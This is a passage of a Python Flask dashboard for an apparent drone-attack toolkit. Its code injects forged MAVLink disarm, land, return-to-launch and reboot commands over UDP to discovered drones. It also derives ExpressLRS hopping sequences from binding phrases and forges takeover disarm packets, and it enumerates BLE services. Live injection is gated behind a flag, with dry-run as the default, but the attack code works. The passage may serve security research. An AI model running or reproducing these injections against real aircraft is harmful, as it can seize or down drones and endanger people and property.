                f"system IDs: {result['system_ids']}, "
                f"signing: {result['signing']}"
            ),
            "data": {
                "packets_captured": result["packets_captured"],
                "system_ids": result["system_ids"],
                "signing": result["signing"],
                "heartbeat": result.get("heartbeat"),
            },
        }

    cmd_map = {
        "disarm": (MAV_CMD_ARM_DISARM, [0, 21196, 0, 0, 0, 0, 0]),
        "land": (MAV_CMD_NAV_LAND, [0, 0, 0, 0, 0, 0, 0]),
        "rtl": (MAV_CMD_NAV_RTL, [0, 0, 0, 0, 0, 0, 0]),
        "reboot": (MAV_CMD_REBOOT, [1, 0, 0, 0, 0, 0, 0]),
    }

    if action_name == "replay":
        return {
            "status": "executed",
            "message": "Replay requires captured packets. Use sniff first, then replay from CLI: "
                       f"python3 tools/exploit_chains/mavlink_chain.py --arm --target {target_str} --replay",
        }

    if action_name not in cmd_map:
        return {"status": "error", "message": f"Unknown MAVLink action: {action_name}"}

    cmd_id, params = cmd_map[action_name]

    if source:
        ip = source.split(":")[0]
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            for i in range(5):
                pkt = build_command_long(sys_id, 1, cmd_id, list(params), seq=i)
                sock.sendto(pkt, (ip, port))
                time.sleep(0.1)
            return {
                "status": "executed",
                "message": f"Injected {action_name} command (5 copies) to {ip}:{port} sys_id={sys_id}",
            }
        finally:
            sock.close()
    else:
        return {
            "status": "error",
            "message": "No source address known. Run sniff first to discover the target endpoint.",
        }


def _exec_elrs(target: dict[str, Any], action_name: str, details: dict[str, Any]) -> dict[str, Any]:
    """Execute ELRS exploit chain actions."""
    from exploit_chains.elrs_chain import (
        phrase_to_uid, uid_to_fhss_seed, uid_to_crc_init,
        compute_fhss_sequence, forge_takeover_packets,
    )

    phrase = details.get("binding_phrase")
    uid_hex = details.get("uid_hex")
    ota_version = details.get("ota_version", 3)

    if action_name == "preview_fhss":
        if phrase:
            uid = phrase_to_uid(phrase)
        elif uid_hex:
            uid = bytes.fromhex(uid_hex.replace(":", ""))
        else:
            return {"status": "error", "message": "No binding phrase or UID available for FHSS preview"}

        seed = uid_to_fhss_seed(uid, ota_version)
        seq = compute_fhss_sequence(seed, ota_version=ota_version)
        return {
            "status": "executed",
            "message": f"FHSS sequence computed. Seed=0x{seed:08X}, first 20 hops: {seq[:20]}",
            "data": {
                "uid": ":".join(f"{b:02X}" for b in uid),
                "fhss_seed": f"0x{seed:08X}",
                "crc_init": f"0x{uid_to_crc_init(uid, ota_version):04X}",
                "sequence_preview": seq[:20],
                "total_channels": len(seq),
            },
        }

    elif action_name == "forge_disarm":
        if phrase:
            uid = phrase_to_uid(phrase)
        elif uid_hex:
            uid = bytes.fromhex(uid_hex.replace(":", ""))
        else:
            return {"status": "error", "message": "No binding phrase or UID available for packet forging"}

        logger = ChainLogger("web-elrs-forge")
        packets = forge_takeover_packets(uid, ota_version, logger)
        packet_summary = [
            {"hop": p["hop_index"], "channel": p["channel"],
             "freq_mhz": p["freq_mhz"], "data_hex": p["data"].hex()}
            for p in packets[:5]
        ]
        return {
            "status": "executed",
            "message": (
                f"Forged {len(packets)} disarm packets across FHSS hops. "
                "RF TX unavailable (no LoRa PHY). Packets shown for analysis."
            ),
            "data": {"packet_count": len(packets), "preview": packet_summary},
        }

    elif action_name == "scan_deeper":
        try:
            from exploit_chains.elrs_chain import scan_for_elrs, soapy_available
            if not soapy_available():
                return {"status": "error", "message": "SoapySDR not available for deep scan"}

            sdr_args = details.get("sdr_args", "driver=uhd")
            logger = ChainLogger("web-elrs-deep-scan")
            abort = AbortHandler(logger)
            detections = scan_for_elrs(sdr_args, 15.0, logger, abort)

            if detections:
                return {
                    "status": "executed",
                    "message": f"Deep scan found {len(detections)} signal(s) in 2.4 GHz band",
                    "data": {"detections": detections},
                }
            return {"status": "executed", "message": "Deep scan complete — no ELRS signals detected"}
        except Exception as e:
            return {"status": "error", "message": f"Deep scan failed: {e}"}

    return {"status": "error", "message": f"Unknown ELRS action: {action_name}"}


def _exec_ble(target: dict[str, Any], action_name: str, details: dict[str, Any]) -> dict[str, Any]:
    """Execute BLE scanning/enumeration actions."""
    if action_name == "ble_scan_services":
        address = details.get("address", "")
        if not address:
            return {"status": "error", "message": "No BLE address to scan"}

        try:
            import asyncio
            from bleak import BleakClient

            async def enumerate_services():
                async with BleakClient(address, timeout=10.0) as client:
                    services = []
                    for service in client.services:
                        chars = []
                        for char in service.characteristics:
                            chars.append({
                                "uuid": str(char.uuid),
                                "properties": char.properties,
                            })
                        services.append({
                            "uuid": str(service.uuid),
                            "description": service.description or str(service.uuid),
                            "characteristics": chars,
                        })
                    return services

            loop = asyncio.new_event_loop()
            try:
                services = loop.run_until_complete(enumerate_services())
            finally:
                loop.close()

            return {
                "status": "executed",
                "message": f"Found {len(services)} GATT services on {address}",
                "data": {"services": services},
            }
        except ImportError:
            return {"status": "error", "message": "bleak library not installed (pip install bleak)"}
        except Exception as e:
            return {"status": "error", "message": f"BLE scan failed: {e}"}

    return {"status": "error", "message": f"Unknown BLE action: {action_name}"}


# --- Flask routes ---

@dashboard.route("/")
def index() -> str:
    return render_template("index.html")


@dashboard.route("/api/status")
def api_status() -> Response:
    state = get_dashboard_state()
    with state.scan_lock:
        target_list = sorted(
            state.targets.values(),
            key=lambda t: t.get("score", 0),
            reverse=True,
        )
        scanning = state.is_scanning
        status_snapshot = dict(state.scanner_status)
    return jsonify({
        "scanning": scanning,
        "scanner_status": status_snapshot,
        "target_count": len(target_list),
        "targets": target_list,
        "simulate": state.simulate_mode,
        "dry_run": state.dry_run_mode,
        "hardware": state.hw_status,
    })


@dashboard.route("/api/scan", methods=["POST"])
def api_scan() -> tuple[Response, int] | Response:
    state = get_dashboard_state()
    body = request.get_json(silent=True)
    if body is None:
        if request.content_length:
            return jsonify({"error": "Request body must contain valid JSON"}), 400
        body = {}
    if not isinstance(body, dict):
        return jsonify({"error": "JSON body must be an object"}), 400

    protocols = body.get("protocols", list(DEFAULT_PROTOCOLS))
    if (not isinstance(protocols, list) or not protocols
            or any(not isinstance(name, str) for name in protocols)):
        return jsonify({"error": "protocols must be a non-empty list of strings"}), 400
    unknown_protocols = sorted(set(protocols) - VALID_PROTOCOLS)
    if unknown_protocols:
        return jsonify({"error": f"Unknown protocols: {', '.join(unknown_protocols)}"}), 400
    protocols = list(dict.fromkeys(protocols))

    scan_time = body.get("scan_time", 15.0)
    if (isinstance(scan_time, bool) or not isinstance(scan_time, (int, float))
            or not 0 < scan_time <= 300):
        return jsonify({"error": "scan_time must be a finite number between 0 and 300 seconds"}), 400

    config = {
        "wifi_iface": body.get("wifi_iface", state.scan_defaults["wifi_iface"]),
        "ble_iface": body.get("ble_iface", state.scan_defaults["ble_iface"]),
        "sdr_args": body.get("sdr_args", state.scan_defaults["sdr_args"]),
        "scan_time": float(scan_time),
    }

    with state.scan_lock:
        if state.is_scanning:
            return jsonify({"error": "Scan already in progress"}), 409
        state.scanner_status.update({name: "idle" for name in DEFAULT_PROTOCOLS})
        state.is_scanning = True

    try:
        if state.simulate_mode:
            t = threading.Thread(
                target=run_scan_simulated, args=(state, protocols), daemon=True,
            )
        else:
            t = threading.Thread(
                target=run_scan_live, args=(state, protocols, config), daemon=True,
            )
        t.start()
    except Exception:
        _finish_scan(state)
        return jsonify({"error": "Unable to start scan worker"}), 500

    return jsonify({
        "status": "scanning",
        "protocols": protocols,
        "simulate": state.simulate_mode,
    })


@dashboard.route("/api/targets/<path:target_id>")
def api_target_detail(target_id: str) -> tuple[Response, int] | Response:
    state = get_dashboard_state()
    with state.scan_lock:
        target = state.targets.get(target_id)
    if not target:
        return jsonify({"error": "Target not found"}), 404
    return jsonify(target)


@dashboard.route("/api/targets/<path:target_id>/action", methods=["POST"])
def api_target_action(target_id: str) -> tuple[Response, int] | Response:
    state = get_dashboard_state()
    with state.scan_lock:
        target = state.targets.get(target_id)
    if not target:
        return jsonify({"error": "Target not found"}), 404

    body = request.get_json(silent=True)
    action_name = body.get("action") if isinstance(body, dict) else None
    if not action_name:
        return jsonify({"error": "No action specified"}), 400

    if action_name not in target.get("available_actions", []):
        return jsonify({"error": f"Action '{action_name}' not available for this target"}), 400

    if state.simulate_mode or state.dry_run_mode:
        result = execute_action_simulated(state, target, action_name)
    else:
        result = execute_action_live(state, target, action_name)

    return jsonify(result)


@dashboard.route("/api/actions")
def api_action_defs() -> Response:
    return jsonify(ACTION_DEFS)


@dashboard.route("/api/log")
def api_log() -> Response:
    state = get_dashboard_state()
    return jsonify(state.action_log[-50:])


@dashboard.route("/api/clear", methods=["POST"])
def api_clear() -> tuple[Response, int] | Response:
    state = get_dashboard_state()
    with state.scan_lock:
        if state.is_scanning:
            return jsonify({"error": "Cannot clear targets while a scan is in progress"}), 409
        state.targets.clear()
    _push_event(state, "targets_cleared", {})
    return jsonify({"status": "cleared"})


@dashboard.route("/api/hardware")
def api_hardware() -> Response:
    state = get_dashboard_state()
    if state.simulate_mode:
        state.hw_status = simulated_hardware_status()
    else:
        state.hw_status = detect_hardware()
    return jsonify(state.hw_status)


@dashboard.route("/api/events")
def api_events() -> Response:
    """Server-Sent Events stream for real-time status updates.

    A brand-new browser starts at the current event tail so retained history is
    not replayed as fresh notifications.  Genuine EventSource reconnects still
    resume from ``Last-Event-ID``.  If the server restarted and its monotonic
    counter is now behind the browser's cursor, reset that stale cursor to the
    current tail so future events are delivered.
    """
    state = get_dashboard_state()
    header_last_id = request.headers.get("Last-Event-ID", type=int)
    query_last_id = request.args.get("last_id", type=int)
    cursor_provided = (
        "last_id" in request.args or "Last-Event-ID" in request.headers
    )

    with state.events_lock:
        tail_id = state.events[-1]["id"] if state.events else -1
        next_id = state.next_event_id

    last_id = query_last_id if query_last_id is not None else header_last_id
    if not cursor_provided or last_id is None or last_id >= next_id:
        last_id = tail_id

    def generate() -> Generator[str, None, None]:
        local_last = last_id
        # Flush headers immediately without replaying a domain event. Browsers
        # otherwise remain in EventSource.CONNECTING until the next event.
        yield ": connected\n\n"
        while True:
            with state.events_lock:
                new_events = [e for e in state.events if e["id"] > local_last]
            for ev in new_events:
                local_last = ev["id"]
                yield f"id: {ev['id']}\nevent: {ev['type']}\ndata: {json.dumps(ev['data'])}\n\n"
            time.sleep(0.5)

    return Response(generate(), mimetype="text/event-stream",
                    headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"})


# --- Chain 2: WiFi → MAVLink injection endpoints ---

@dashboard.route("/api/chain2/status")
def api_chain2_status() -> Response:
    return jsonify(get_dashboard_state().chain2_state)


@dashboard.route("/api/chain2/simulate", methods=["POST"])
def api_chain2_simulate() -> tuple[Response, int] | Response:
    """Run a simulated Chain 2 attack for demo purposes."""
    state = get_dashboard_state()
    try:
        from exploit_chains.wifi_mavlink_chain import (
            ATTACK_COMMANDS, build_command_long,
        )
    except ImportError:
        return jsonify({"error": "Chain 2 module not found"}), 500

    target_id = request.json.get("target_id") if request.json else None
    commands = request.json.get("commands", ["disarm", "land"]) if request.json else ["disarm", "land"]

    results = []
    for cmd_name in commands:
        if cmd_name not in ATTACK_COMMANDS:
            results.append({"command": cmd_name, "status": "unknown"})
            continue
        cmd = ATTACK_COMMANDS[cmd_name]
        pkt = build_command_long(1, 1, cmd["cmd_id"], list(cmd["params"]))
        entry = {
            "id": uuid.uuid4().hex[:8],
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "target_id": target_id,
            "command": cmd_name,
            "description": cmd["desc"],
            "severity": cmd["severity"],
            "status": "simulated",
            "packet_hex": pkt.hex(),
            "packet_size": len(pkt),
        }
        results.append(entry)
        state.action_log.append({
            "id": entry["id"],
            "timestamp": entry["timestamp"],
            "target_id": target_id,
            "target_name": target_id or "MAVLink Target",
            "action": f"chain2_{cmd_name}",
            "label": f"Chain 2: {cmd['desc']}",
            "status": "simulated",
            "result": f"[SIMULATED] {cmd['desc']} ({len(pkt)} bytes)",
        })

    state.chain2_state["last_injection"] = results[-1] if results else None
    state.chain2_state["injections"].extend(results)

    return jsonify({
        "chain": "wifi_mavlink",
        "status": "simulated",
        "results": results,
    })


@dashboard.route("/api/chain2/inject", methods=["POST"])
def api_chain2_inject() -> tuple[Response, int] | Response:
    """Inject a MAVLink command via Chain 2 (dry-run in simulate mode)."""
    state = get_dashboard_state()
    if not request.json:
        return jsonify({"error": "JSON body required"}), 400

    target_id = request.json.get("target_id")
    command = request.json.get("command")
    target_endpoint = request.json.get("endpoint")

    if not command:
        return jsonify({"error": "command is required"}), 400

    try:
        from exploit_chains.wifi_mavlink_chain import ATTACK_COMMANDS, build_command_long
    except ImportError:
        return jsonify({"error": "Chain 2 module not found"}), 500

    if command not in ATTACK_COMMANDS:
        return jsonify({"error": f"Unknown command: {command}"}), 400

    cmd = ATTACK_COMMANDS[command]
    pkt = build_command_long(1, 1, cmd["cmd_id"], list(cmd["params"]))

    entry = {
        "id": uuid.uuid4().hex[:8],
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "target_id": target_id,
        "command": command,
        "description": cmd["desc"],
        "severity": cmd["severity"],
        "status": "dry_run" if state.simulate_mode or state.dry_run_mode else "pending",
        "packet_hex": pkt.hex(),
        "packet_size": len(pkt),
    }

    if not state.simulate_mode and not state.dry_run_mode and target_endpoint:
        import socket as _sock
        parts = target_endpoint.split(":")
        if len(parts) == 2:
            try:
                sock = _sock.socket(_sock.AF_INET, _sock.SOCK_DGRAM)
                for i in range(5):
                    p = build_command_long(1, 1, cmd["cmd_id"],
                                           list(cmd["params"]), seq=i)
                    sock.sendto(p, (parts[0], int(parts[1])))
                    time.sleep(0.05)
                sock.close()
                entry["status"] = "sent"
            except Exception as e:
                entry["status"] = "error"
                entry["error"] = str(e)

    state.action_log.append({
        "id": entry["id"],
        "timestamp": entry["timestamp"],
        "target_id": target_id,
        "target_name": target_id or "MAVLink Target",
        "action": f"chain2_{command}",
        "label": f"Chain 2: {cmd['desc']}",
        "status": entry["status"],
        "result": f"[{entry['status'].upper()}] {cmd['desc']}",
    })

    state.chain2_state["last_injection"] = entry
    state.chain2_state["injections"].append(entry)

    return jsonify(entry)


@dashboard.route("/api/chain2/commands")
def api_chain2_commands() -> tuple[Response, int] | Response:
    """List available Chain 2 attack commands."""
    try:
        from exploit_chains.wifi_mavlink_chain import ATTACK_COMMANDS
        return jsonify(ATTACK_COMMANDS)
    except ImportError:
        return jsonify({"error": "Chain 2 module not found"}), 500


def create_app(state: DashboardState | None = None) -> Flask:
    """Create a Flask dashboard with isolated, app-owned runtime state."""
    flask_app = Flask(__name__)
    flask_app.extensions[STATE_EXTENSION_KEY] = state or create_dashboard_state()
    flask_app.register_blueprint(dashboard)
    return flask_app


# Import compatibility: existing WSGI users can continue importing ``app``.
app = create_app()


def main() -> None:
    parser = argparse.ArgumentParser(description="Drone Scanner Web UI")
    parser.add_argument("--port", type=int, default=5000)
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--simulate", action="store_true",
                        help="Demo mode with simulated targets")
    parser.add_argument("--debug", action="store_true")
    parser.add_argument("--live-actions", action="store_true",
                        help="Enable live action execution (default: dry-run only)")
    parser.add_argument("--wifi-iface", default="wlan0",
                        help="Default WiFi interface (default: wlan0)")
    parser.add_argument("--ble-iface", default="hci0",
                        help="Default BLE interface (default: hci0)")
    parser.add_argument("--sdr-args", default="driver=uhd",
                        help="Default SoapySDR device args (default: driver=uhd)")
    args = parser.parse_args()

    state = get_dashboard_state(app)
    state.simulate_mode = args.simulate
    state.dry_run_mode = not args.live_actions
    state.scan_defaults.update({
        "wifi_iface": args.wifi_iface,
        "ble_iface": args.ble_iface,
        "sdr_args": args.sdr_args,
    })

    if not state.simulate_mode:
        state.hw_status = detect_hardware()

    app.run(host=args.host, port=args.port, debug=args.debug)


if __name__ == "__main__":
    main()
